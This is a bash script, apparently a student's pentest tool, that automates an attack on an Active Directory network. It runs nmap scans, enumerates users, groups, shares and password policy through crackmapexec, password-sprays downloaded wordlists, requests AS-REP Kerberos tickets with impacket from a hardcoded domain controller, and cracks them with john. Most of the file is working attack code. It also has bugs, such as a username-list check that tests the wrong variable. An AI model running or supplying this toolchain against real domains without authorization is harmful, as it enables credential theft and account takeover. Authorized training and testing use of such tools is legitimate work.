#!/bin/bash

echo "+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+                                                           +
+   GGGGG   RRRRR   EEEEE  EEEEE  TTTTT  III  N   N  GGGGG  +
+  G        R   R   E      E        T    I   NN  N  G       +
+  G  GG    RRRRR   EEEE   EEEE     T    I   N N N  G  GG   +
+  G   G    R  R    E      E        T    I   N  NN  G   G   +
+   GGG     R   R   EEEEE  EEEEE    T   III  N   N  GGGGG  +
+                                                           +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
a tool made by a fellow student :)"
echo ""
echo ""
echo ""
echo "this tool works best if you have AD credentials and use advanced enumeration and exploitation with them for the best results"

#if you are not root it exits
if [ $(whoami) != "root" ]; then
echo "[*] This script requires root privileges to run. Please run it as root."
exit 1
fi

#continues here for root user
echo "[*] You are root. Proceeding with the script..."

echo "[*] Creating folder for storing reports"
output_folder="script_outputs" 
mkdir -p $output_folder


echo "[*] Updating the system"
echo ""
sudo apt update 
echo ""
echo "[*] checking for tools"
#makes an array for the tools needed and checks if they are installed
tools=("hashcat" "enscript")
function check_tool() {
tool=$1
if dpkg -s "$tool" &> /dev/null; then
echo "[+] $tool is already installed."
else
echo "[-] $tool is not installed."
install_tool "$tool" #calls on the next function after checking each tool to install it if missing
fi
}

function install_tool() {
tool=$1
retries=3 #tries 3 time to install tools if fails maybe if you have internet issues
for ((attempt=1; attempt<=retries; attempt++)); do
echo "[*] Installing $tool..."
sudo apt-get -y install "$tool"
if [ $? -eq 0 ]; then
echo "[+] $tool installed successfully."
return 0
else
echo "[-] Failed to install $tool. Retrying..."
sleep 2 
fi
done
echo "[-] Failed to install $tool after $retries attempts. Exiting..."
exit 1
}

#loops through the list of tools and check/install each one
for tool in "${tools[@]}"; do
check_tool "$tool"
done



# Function to check if the input the user enters is a valid IPv4 address
function validate_network() {
local network="$1"
#checks if the user entered a valid input through expressions for ipv4+cidr
if [[ $network =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}(\/[0-9]{1,2})?$ ]]; then
return 0
else
return 1
fi
}

#function to validate if a file exists
function validate_file() {
local file="$1"
if [[ -f "$file" ]]; then
return 0  #file exists
else
return 1  #file does not exist
fi
}

#function to map short input to full level names
determine_levels() {
local level=$1
case $level in
n) echo "None";;
b) echo "Basic";;
i) echo "Basic, Intermediate";;
a) echo "Basic, Intermediate, Advanced";;
*) echo "Invalid";;
esac
}

#prompts the user to enter a network to scan
while true; do
read -p "Enter the network to scan: " network
if validate_network "$network"; then
echo "You entered: $network"
break
else
echo "Invalid input. Please try again."
fi
done

#asks the user for a username list otherwise defaults to one
while true; do
read -p "Do you want to provide your own username list? (y/n): " user_choice
if [[ "$user_choice" == "y" || "$user_choice" == "n" ]]; then
break
else
echo "Invalid input. Please enter 'y' or 'n'."
fi
done

if [[ "$user_choice" == "y" ]]; then
while true; do
read -p "Please provide the full path to your username list: " username_list
if validate_file "$password_list"; then
echo "Valid password list found at: $password_list"
break
else
echo "Invalid file path or file does not exist. Please try again."
fi
done
else
if [ ! -d "common-ad-usernames" ]; then
#if the username list doesnt exist it downloads it and adds some keywords to it
git clone https://github.com/crypt0rr/common-ad-usernames.git
fi
username_list="common-ad-usernames/users.txt"
echo "using default username list: $username_list"
echo "pentestme" >> $username_list

fi

#ask the user if they want to provide their own password list
while true; do
read -p "Do you want to provide your own password list? (y/n): " user_choice
if [[ "$user_choice" == "y" || "$user_choice" == "n" ]]; then
break
else
echo "Invalid input. Please enter 'y' or 'n'."
fi
done

#asks the user to provide their own password list if they choose to, and downloads one if they choose not to
if [[ "$user_choice" == "y" ]]; then
while true; do
read -p "Please provide the full path to your password list: " password_list
if validate_file "$password_list"; then
echo "Valid password list found at: $password_list"
break
else
echo "Invalid file path or file does not exist. Please try again."
fi
done
else
if [ ! -d "common-password-list" ]; then
git clone https://github.com/josuamarcelc/common-password-list.git
fi
default_password_list="common-password-list/rockyou.txt/rockyou_1.txt"
echo "Using default password list: $default_password_list"
password_list="$default_password_list"
fi

#ask for the Domain name and Active Directory credentials
read -p "Enter the Domain name (e.g., company.local): " domain_name
read -p "Enter the Active Directory (AD) username: " ad_username
read -sp "Enter the Active Directory (AD) password: " ad_password
echo  # To add a newline after password input


#function to validate operation level selection
validate_operation_level() {
local level=$1
case $level in
b|i|a|n) return 0;;
*) return 1;;
    esac
}

#functions for scanning
run_scanning_basic() {
echo "[**] Running basic scanning..."
nmap -Pn $network | tee $output_folder/scan.txt
}
#scans all tcp ports
run_scanning_intermediate() {
echo "[**] Running intermediate scanning..."
nmap -Pn -p- $network | tee $output_folder/scan.txt
}
#scans all tcp and udp ports
run_scanning_advanced() {
echo "[**] Running advanced scanning..."
nmap -Pn -p- -sU $network | tee $output_folder/scan.txt
}

#scans for version and grabs the ip of the one that has kerberos and domain ports open
run_enumeration_basic() {
echo "[**] Running basic enumeration..."
echo ""
echo "[*] Scanning..."
nmap -Pn -sV $network | tee nmap_rep.txt    
#check if specific ports are open and extract the IP address
ip_address="" # Read through the nmap report to find the correct IP address
while read -r line;do
if echo "$line" | grep -q "Nmap scan report for";then
current_ip=$(echo "$line" | awk '{print $5}')
elif echo "$line" | grep -q "53/tcp.*open.*domain"; then 
domain_open=1 
elif echo "$line" | grep -q "88/tcp.*open.*kerberos-sec"; then
 kerberos_open=1 
 fi 
 if [ "$domain_open" ] && [ "$kerberos_open" ]; then
 ip_address=$current_ip
break 
 fi 
 done < nmap_rep.txt 
 if [ -n "$ip_address" ]; then echo "[*] The IP address of the domain is: $ip_address"

echo "[*] Scanning for DHCP"
echo ""
nmap -sP --script broadcast-dhcp-discover $ip_address | tee nmap_dhcp.txt
dhcp_ip=$(grep "Server Identifier:" nmap_dhcp.txt | awk '{print $4}')
echo " [*] the DHCP IP Adddress is $dhcp_ip"
fi
}


run_enumeration_intermediate() {
echo "[**] Running intermediate enumeration..."
echo ""
echo "[*] Scanning..."
nmap -Pn -sV $network | tee nmap_rep.txt    
#check if specific ports are open and extract the IP address
ip_address="" # Read through the nmap report to find the correct IP address
 while read -r line;do
if echo "$line" | grep -q "Nmap scan report for";then
current_ip=$(echo "$line" | awk '{print $5}')
elif echo "$line" | grep -q "53/tcp.*open.*domain"; then 
domain_open=1 
elif echo "$line" | grep -q "88/tcp.*open.*kerberos-sec"; then
 kerberos_open=1 
 fi 
 if [ "$domain_open" ] && [ "$kerberos_open" ]; then
 ip_address=$current_ip
break 
 fi 
 done < nmap_rep.txt 
 if [ -n "$ip_address" ]; then echo "[*] The IP address of the domain is: $ip_address"
echo "[*] Scanning for DHCP"
echo ""
nmap -sP --script broadcast-dhcp-discover $ip_address | tee nmap_dhcp.txt
dhcp_ip=$(grep "Server Identifier:" nmap_dhcp.txt | awk '{print $4}')
echo " [*] the DHCP IP Adddress is $dhcp_ip"

echo "[*] Scanning for key services..."
nmap -p 21,22,445,5985,5986,389,636,3389 -sV -Pn $ip_address | tee key_services_report.txt    

echo "[*] Enumerating shared folders..."
nmap -p 445 --script smb-enum-shares -Pn $ip_address | tee smb_shares_report.txt

echo "[*] Running NSE Scripts"
nmap -p 445 --script smb-os-discovery $ip_address | tee $output_folder/smb_disc.txt
nmap -p 80,443 --script http-enum $ip_address | tee $output_folder/http_enu.txt
nmap -p 53 --script smb-protocols -Pn $ip_address | tee $output_folder/smb_prot.txt
fi
}

run_enumeration_advanced() {
echo "[**] Running advanced enumeration..."
echo ""
echo "[*] Scanning..."
nmap -Pn -sV $network | tee nmap_rep.txt    
#check if specific ports are open and extract the IP address
ip_address="" # Read through the nmap report to find the correct IP address
 while read -r line;do
if echo "$line" | grep -q "Nmap scan report for";then
current_ip=$(echo "$line" | awk '{print $5}')
elif echo "$line" | grep -q "53/tcp.*open.*domain"; then 
domain_open=1 
elif echo "$line" | grep -q "88/tcp.*open.*kerberos-sec"; then
 kerberos_open=1 
 fi 
 if [ "$domain_open" ] && [ "$kerberos_open" ]; then
 ip_address=$current_ip
break 
 fi 
 done < nmap_rep.txt 
 if [ -n "$ip_address" ]; then echo "[*] The IP address of the domain is: $ip_address"
echo "[*] Scanning for DHCP"
echo ""
nmap -sP --script broadcast-dhcp-discover $ip_address | tee nmap_dhcp.txt
dhcp_ip=$(grep "Server Identifier:" nmap_dhcp.txt | awk '{print $4}')
echo " [*] the DHCP IP Adddress is $dhcp_ip"

echo "[*] Scanning for key services..."
nmap -p 21,22,445,5985,5986,389,636,3389 -sV -Pn $ip_address | tee key_services_report.txt    

echo "[*] Enumerating shared folders..."
nmap -p 445 --script smb-enum-shares -Pn $ip_address | tee smb_shares_report.txt

echo "[*] Running NSE Scripts"
nmap -p 445 --script smb-os-discovery $ip_address | tee $output_folder/smb_disc.txt
nmap -p 80,443 --script http-enum $ip_address | tee $output_folder/http_enu.txt
nmap -p 445 --script smb-protocols -Pn $ip_address | tee $output_folder/smb_prot.txt
#runs crackmapexec commands to enumerate domain
if [ -n "$ad_username" ] && [ -n "$ad_password" ]; then
echo "[**] Extracting all users..." 
crackmapexec smb $ip_address -u $ad_username -p $ad_password --users | tee user_output_file.txt

awk 'NR>3 {print $5}' user_output_file.txt | sed 's/^netsec\.local\\//' > user_list.txt
new_user_list=user_list.txt
username_list=$new_user_list
echo "using new username list:$username_list"

echo "[**] Extracting all groups.."
crackmapexec smb $ip_address -u $ad_username -p $ad_password --groups | tee $output_folder/dom_groups.txt
echo "[**] Extracting all shares..."
crackmapexec smb $ip_address -u $ad_username -p $ad_password --shares | tee $output_folder/dom_shares.txt
echo "[**] Extracting password policy"
crackmapexec smb $ip_address -u $ad_username -p $ad_password --pass-pol | tee $output_folder/pass_pol.txt
echo "[**] Extracting disabled acconuts"
crackmapexec smb $ip_address -u $ad_username -p $ad_password -x 'Get-ADUser -Filter {Enabled -eq $false} | Select-Object -Property SamAccountName' | tee $output_folder/dis_acc.txt
echo "[**] Extracting never expired accounts"
crackmapexec smb $ip_address -u $ad_username -p $ad_password -x 'Search-ADAccount -PasswordNeverExpires -UsersOnly | Select-Object -Property SamAccountName' | tee $output_folder/exp_acc.txt
echo "[**] Extracting accounts in the domain admins group"
crackmapexec smb $ip_address -u $ad_username -p $ad_password -x'Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object -Property SamAccountName' | tee $output_folder/domain_admin_groups.txt
else 
echo "[*] No AD credentials provided. Skipping credential-requiring tasks."
  fi
fi
}
#scans for vulnerabilities
#password_list=$username_list
run_exploitation_basic() {
echo "[**] Running basic exploitation..."
echo ""
echo "Scanning for vulnerabilities"
nmap -Pn -sV --script vuln $ip_address | tee $output_folder/vuln_scan.txt
}

run_exploitation_intermediate() {
echo "[**] Running intermediate exploitation..."
echo ""
echo "Scanning for vulnerabilities"
nmap -Pn -sV --script vuln $ip_address | tee $output_folder/vuln_scan.txt
echo ""
echo "Starting password spraying for domain users"
crackmapexec smb $ip_address -u $username_list -p $password_list --continue-on-success | tee $output_folder/pass_Spray.txt #commences password spraying on the domain
}

run_exploitation_advanced() {
echo "[**] Running advanced exploitation..."
echo ""
echo "Scanning for vulnerabilities"
nmap -Pn -sV --script vuln $ip_address | tee $output_folder/vuln_scan.txt
echo ""
echo "Starting password spraying for domain users"
crackmapexec smb $ip_address -u $username_list -p $password_list --continue-on-success | tee $output_folder/pass_Spray.txt
echo ""
echo "Extracting kerberos tickets"
impacket-GetNPUsers netsec.local/ -usersfile $username_list -dc-ip 192.168.79.136 -request | tee kerberos_tickets.txt #grabs kerberos tickets and attempts to crack them
grep -E '\$krb5asrep\$' kerberos_tickets.txt > prop_kerberos.txt

echo ""
echo "Attempting to crack ticket passwords"
john --format=krb5asrep --wordlist=$password_list prop_kerberos.txt | tee $output_folder/kerb_tickets_rep.txt

}


#require the user to select a desired operation level for each mode
echo "Select the operation level for each mode (b for Basic, i for Intermediate, a for Advanced, n for None):"

#scanning level selection
while true; do
read -p "Scanning level (b/i/a/n): " scanning_level
    if validate_operation_level "$scanning_level"; then
        scanning_modes=$(determine_levels "$scanning_level")
        echo "Scanning mode includes: $scanning_modes"

        case $scanning_level in
            b)
                run_scanning_basic
                ;;
            i)
                run_scanning_intermediate
                ;;
            a)
                run_scanning_advanced
                ;;
            n)
                echo "Skipping Scanning mode."
                ;;
        esac
        break
    else
        echo "Invalid level. Please enter one of: b, i, a, n."
    fi
done

#enumeration level selection
while true; do
    read -p "Enumeration level (b/i/a/n): " enumeration_level
    if validate_operation_level "$enumeration_level"; then
        enumeration_modes=$(determine_levels "$enumeration_level")
        echo "Enumeration mode includes: $enumeration_modes"

        case $enumeration_level in
            b)
                run_enumeration_basic
                ;;
            i)
                run_enumeration_intermediate
                ;;
            a)
                run_enumeration_advanced
                ;;
            n)
                echo "Skipping Enumeration mode."
                ;;
        esac
        break
    else
        echo "Invalid level. Please enter one of: b, i, a, n."
    fi
done

# Exploitation level selection
while true; do
    read -t 10 -p "Exploitation level (b/i/a/n): " exploitation_level
    if validate_operation_level "$exploitation_level"; then
        exploitation_modes=$(determine_levels "$exploitation_level")
        echo "Exploitation mode includes: $exploitation_modes"

        case $exploitation_level in
            b)
                run_exploitation_basic
                ;;
            i)
                run_exploitation_intermediate
                ;;
            a)
                run_exploitation_advanced
                ;;
            n)
                echo "Skipping Exploitation mode."
                ;;
        esac
        break
    else
        echo "Invalid level. Please enter one of: b, i, a, n."
    fi
done

#moves all reports into one folder and saves them as pdf
echo "Saving all reports as pdf"
mv kerberos_tickets.txt $output_folder
mv key_services_report.txt $output_folder
mv nmap_dhcp.txt $output_folder
mv nmap_rep.txt $output_folder
mv smb_shares_report.txt $output_folder
mv user_list.txt $output_folder
mv user_output_file.txt $output_folder
mv prop_kerberos.txt $output_folder
cat $output_folder/*.txt > combined_reports.txt

for file in $output_folder/*.txt; do
    enscript "$file" -o "${file%.txt}.ps"
done
for file in $output_folder/*.ps; do
    ps2pdf "$file" "${file%.ps}.pdf"
done

